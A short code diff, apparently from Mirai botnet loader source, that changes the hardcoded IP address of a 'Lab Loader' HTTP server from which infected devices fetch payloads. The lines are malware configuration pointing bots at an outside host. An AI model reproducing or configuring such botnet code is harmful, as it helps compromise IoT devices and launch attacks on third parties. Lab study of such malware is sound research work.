@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(185,10,30,10) // Lab Loader HTTP: 185.10.30.10
+#define HTTP_SERVER utils_inet_addr(185,10,20,200) // Lab Loader HTTP: 185.10.20.200
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
